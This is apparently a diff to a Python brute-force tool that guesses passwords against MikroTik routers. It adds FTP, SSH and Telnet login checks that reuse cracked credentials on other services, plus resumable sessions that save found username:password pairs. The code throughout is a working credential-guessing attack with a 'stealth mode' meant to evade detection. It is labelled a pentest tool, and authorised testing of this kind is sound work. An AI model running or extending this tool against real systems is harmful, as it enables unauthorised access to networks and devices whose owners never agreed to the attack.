@@ -67,6 +67,7 @@ try:
     from _wordlists import SmartWordlistManager
     from _reports import PentestReportGenerator
     from _cli import PentestCLI
+    from _session import SessionManager
 except ModuleNotFoundError as e:
     print(f"[WARN] Some v2.1 modules not available: {e}")
     ResultExporter = None
@@ -77,6 +78,7 @@ except ModuleNotFoundError as e:
     SmartWordlistManager = None
     PentestReportGenerator = None
     PentestCLI = None
+    SessionManager = None
 
 # Check if the required modules are available
 def current_time():
@@ -100,9 +102,52 @@ def test_restapi_login(host, username, password, port, use_ssl=False):
     except Exception:
         return False
 
+# Function to test FTP login
+def test_ftp_login(host, username, password, port=21):
+    try:
+        import ftplib
+        ftp = ftplib.FTP()
+        ftp.connect(host, port, timeout=5)
+        ftp.login(username, password)
+        ftp.quit()
+        return True
+    except Exception:
+        return False
+
+# Function to test SSH login
+def test_ssh_login(host, username, password, port=22):
+    try:
+        import paramiko
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        ssh.connect(host, port=port, username=username, password=password, timeout=5, allow_agent=False, look_for_keys=False)
+        ssh.close()
+        return True
+    except Exception:
+        return False
+
+# Function to test Telnet login
+def test_telnet_login(host, username, password, port=23):
+    try:
+        import telnetlib  # type: ignore
+        tn = telnetlib.Telnet(host, port, timeout=5)
+        tn.read_until(b"Login:", timeout=5)
+        tn.write(username.encode('ascii') + b"\n")
+        tn.read_until(b"Password:", timeout=5)
+        tn.write(password.encode('ascii') + b"\n")
+        result = tn.read_some()
+        tn.close()
+        # Check if login was successful (no "Login:" prompt in response)
+        return b"Login:" not in result and b"incorrect" not in result.lower()
+    except Exception:
+        return False
+
+# Web Console testing removed - WebFig returns 406 error for all requests
+# making it impossible to test authentication properly
+
 # Enhanced Bruteforce class with v2.1 features
 class EnhancedBruteforce:
-    def __init__(self, target, usernames, passwords, combo_dict, delay, api_port=8728, rest_port=8729, http_port=80, use_ssl=False, ssl_port=443, max_workers=2, verbose=False, verbose_all=False, validate_services=None, services_ok=None, show_progress=False, proxy_url=None, export_formats=None, export_dir="results", max_retries=1, stealth_mode=True, fingerprint=True):
+    def __init__(self, target, usernames, passwords, combo_dict, delay, api_port=8728, rest_port=8729, http_port=80, use_ssl=False, ssl_port=443, max_workers=2, verbose=False, verbose_all=False, validate_services=None, services_ok=None, show_progress=False, proxy_url=None, export_formats=None, export_dir="results", max_retries=1, stealth_mode=True, fingerprint=True, session_manager=None, resume_session=False, force_new_session=False):
         self.target = target
         self.api_port = api_port
         self.rest_port = rest_port
@@ -135,6 +180,13 @@ class EnhancedBruteforce:
         self.stealth_mode = stealth_mode
         self.fingerprint = fingerprint
         
+        # Session management
+        self.session_manager = session_manager
+        self.resume_session = resume_session
+        self.force_new_session = force_new_session
+        self.session_id = None
+        self.session_data = None
+        
         # Initialize v2.1 modules
         self.stealth_manager = StealthManager(enabled=stealth_mode) if StealthManager else None
         self.fingerprinter = MikrotikFingerprinter() if MikrotikFingerprinter else None
@@ -151,12 +203,61 @@ class EnhancedBruteforce:
         
         self.load_wordlist()
 
+    def _get_default_port(self, service_name):
+        """Get default port for a service."""
+        default_ports = {
+            'ftp': 21,
+            'ssh': 22,
+            'telnet': 23
+        }
+        return default_ports.get(service_name.lower(), 80)
+
     def load_file(self, path):
         with open(path, 'r', encoding='utf-8') as f:
             return [line.strip() for line in f if line.strip()]
 
     def load_wordlist(self):
         try:
+            # Check for existing session first
+            if self.session_manager and not self.force_new_session:
+                services_list = list(self.validate_services.keys()) if self.validate_services else ['api']
+                existing_session = self.session_manager.find_existing_session(
+                    self.target, services_list, []
+                )
+                
+                if existing_session and self.resume_session:
+                    if self.session_manager.should_resume(existing_session):
+                        self.log.info(f"[SESSION] Resuming session {existing_session['session_id']}")
+                        self.session_id = existing_session['session_id']
+                        self.session_data = existing_session
+                        
+                        # Load wordlist from session
+                        self.wordlist = []
+                        for combo in existing_session.get('wordlist', []):
+                            if isinstance(combo, list) and len(combo) == 2:
+                                self.wordlist.append(tuple(combo))
+                        
+                        # Set starting index from session
+                        self.index = existing_session.get('tested_combinations', 0)
+                        
+                        # Load successful credentials
+                        self.successes = existing_session.get('successful_credentials', [])
+                        
+                        self.log.info(f"[SESSION] Resuming from {self.index}/{len(self.wordlist)} combinations")
+                        return
+                    elif existing_session.get('status') == 'completed':
+                        self.log.info(f"[SESSION] Session already completed for {self.target}")
+                        self.log.info(f"[SESSION] Found {len(existing_session.get('successful_credentials', []))} successful credentials")
+                        
+                        # Show results from completed session
+                        for cred in existing_session.get('successful_credentials', []):
+                            self.log.success(f"[SESSION] {cred.get('user')}:{cred.get('pass')} on {cred.get('services', [])}")
+                        
+                        # Exit if session is completed
+                        self.wordlist = []
+                        return
+            
+            # Load wordlist normally
             if self.combo_dict:
                 self.wordlist = [tuple(line.split(':')) for line in self.load_file(self.combo_dict) if ':' in line]
             elif self.usernames and self.passwords:
@@ -184,6 +285,23 @@ class EnhancedBruteforce:
             self.log.error(f"Error loading wordlist: {e}")
             exit(1)
         self.wordlist = list(dict.fromkeys(self.wordlist))
+        
+        # Create new session if session manager is available
+        if self.session_manager and not self.session_id:
+            services_list = list(self.validate_services.keys()) if self.validate_services else ['api']
+            config = {
+                'api_port': self.api_port,
+                'http_port': self.http_port,
+                'ssl_port': self.ssl_port,
+                'use_ssl': self.use_ssl,
+                'max_workers': self.max_workers,
+                'delay': self.delay,
+                'stealth_mode': self.stealth_mode
+            }
+            self.session_id = self.session_manager.create_session(
+                self.target, services_list, self.wordlist, config
+            )
+            self.log.info(f"[SESSION] Created new session: {self.session_id}")
 
     def get_next_combo(self):
         with self.index_lock:
@@ -249,6 +367,38 @@ class EnhancedBruteforce:
                     if self.verbose_all:
                         self.log.warning(f"[REST] error for {user}:{password} — {e}")
 
+            # === Post-login Service Validation ===
+            if services and self.validate_services:
+                self.log.info(f"[VALIDATION] Testing post-login services for {user}:{password}")
+                validation_services = []
+                
+                for service_name, custom_port in self.validate_services.items():
+                    try:
+                        service_port = custom_port if custom_port else self._get_default_port(service_name)
+                        validation_result = False
+                        
+                        if service_name.lower() == 'ftp':
+                            validation_result = test_ftp_login(self.target, user, password, service_port)
+                        elif service_name.lower() == 'ssh':
+                            validation_result = test_ssh_login(self.target, user, password, service_port)
+                        elif service_name.lower() == 'telnet':
+                            validation_result = test_telnet_login(self.target, user, password, service_port)
+                        # Web Console testing removed - not reliable
+                        
+                        if validation_result:
+                            validation_services.append(service_name)
+                            self.log.success(f"[VALIDATION] {service_name.upper()} login successful for {user}:{password}")
+                        else:
+                            self.log.fail(f"[VALIDATION] {service_name.upper()} login failed for {user}:{password}")
+                            
+                    except Exception as e:
+                        self.log.warning(f"[VALIDATION] Error testing {service_name}: {e}")
+                
+                # Add validation services to the services list
+                if validation_services:
+                    services.extend(validation_services)
+                    self.log.success(f"[VALIDATION] Post-login validation successful: {', '.join(validation_services)}")
+
             # === Add valid credential ===
             if services:
                 with self.lock:
@@ -260,6 +410,16 @@ class EnhancedBruteforce:
                 # Update progress bar without success
                 if self.progress_bar:
                     self.progress_bar.update(1, success=False)
+            
+            # Update session progress every 10 attempts or on success
+            if self.session_manager and self.session_id and (self.index % 10 == 0 or services):
+                self.session_manager.update_session(
+                    self.session_id, 
+                    self.index, 
+                    self.successes, 
+                    [],  # failed_combinations - not tracking for now
+                    combo
+                )
 
     def run(self):
         # Show attack configuration
@@ -330,6 +490,11 @@ class EnhancedBruteforce:
             print(f"Stealth Events  : {stealth_stats.get('total_threads', 0)}")
         print("="*60 + "\n")
         
+        # Update session with final results
+        if self.session_manager and self.session_id:
+            self.session_manager.complete_session(self.session_id, self.successes, "completed")
+            self.log.info(f"[SESSION] Session {self.session_id} completed")
+
         self.log.info("[*] Enhanced attack finished.\n")
 
         # === Print results ===
@@ -420,7 +585,7 @@ if __name__ == "__main__":
     # === Post-login Service Validation ===
     parser.add_argument("--validate", help=(
         "Comma-separated list of services to validate after login. "
-        "Supports optional custom ports: ftp, ssh, telnet (e.g., ftp=2121,ssh=2222)"
+        "Supports: ftp, ssh, telnet with optional custom ports (e.g., ftp=2121,ssh=2222)"
     ))
 
     # === Output and Debug ===
@@ -437,11 +602,57 @@ if __name__ == "__main__":
     parser.add_argument("--stealth", action="store_true", help="Enable stealth mode (Fibonacci delays, User-Agent rotation)")
     parser.add_argument("--fingerprint", action="store_true", help="Enable advanced fingerprinting")
     parser.add_argument("--interactive", action="store_true", help="Start interactive CLI mode")
+    parser.add_argument("--resume", action="store_true", help="Resume from previous session if available")
+    parser.add_argument("--force", action="store_true", help="Force new session, ignore existing sessions")
+    parser.add_argument("--session-info", action="store_true", help="Show session information and exit")
+    parser.add_argument("--list-sessions", action="store_true", help="List all available sessions")
 
     args = parser.parse_args()
 
     # Show banner
     Log.banner(version=_version)
+
+    # Session management
+    session_manager = SessionManager() if SessionManager else None
+    
+    # List sessions command
+    if args.list_sessions and session_manager:
+        sessions = session_manager.list_sessions()
+        if not sessions:
+            print("\n[INFO] No sessions found.")
+        else:
+            print(f"\n[INFO] Found {len(sessions)} session(s):")
+            print(f"{'ID':<12} | {'Target':<15} | {'Status':<10} | {'Progress':<8} | {'Success':<7} | {'Last Update'}")
+            print("-" * 80)
+            for session in sessions:
+                progress = f"{session.get('current_progress', 0):.1f}%"
+                success = len(session.get('successful_credentials', []))
+                last_update = session.get('last_update', session.get('start_time', ''))[:16]
+                print(f"{session.get('session_id', 'N/A'):<12} | {session.get('target', 'N/A'):<15} | {session.get('status', 'N/A'):<10} | {progress:<8} | {success:<7} | {last_update}")
+        sys.exit(0)
+    
+    # Session info command
+    if args.session_info and session_manager and args.target:
+        existing_session = session_manager.find_existing_session(
+            args.target, 
+            args.validate.split(',') if args.validate else ['api'],
+            []  # Will be filled with actual wordlist later
+        )
+        if existing_session:
+            stats = session_manager.get_session_stats(existing_session['session_id'])
+            print(f"\n[SESSION INFO]")
+            print(f"Session ID: {stats['session_id']}")
+            print(f"Target: {stats['target']}")
+            print(f"Status: {stats['status']}")
+            print(f"Progress: {stats['progress']:.1f}% ({stats['tested']}/{stats['total']})")
+            print(f"Successful: {stats['successful']}")
+            if stats['average_time']:
+                print(f"Avg time/attempt: {stats['average_time']:.2f}s")
+            if stats['estimated_completion']:
+                print(f"ETA: {session_manager.format_time_estimate(existing_session)}")
+        else:
+            print(f"\n[INFO] No existing session found for target {args.target}")
+        sys.exit(0)
 
     # Interactive mode
     if args.interactive:
@@ -529,7 +740,10 @@ if __name__ == "__main__":
         export_dir=args.export_dir,
         max_retries=args.max_retries,
         stealth_mode=args.stealth,
-        fingerprint=args.fingerprint
+        fingerprint=args.fingerprint,
+        session_manager=session_manager,
+        resume_session=args.resume,
+        force_new_session=args.force
     )
 
     # Set the services_ok attribute
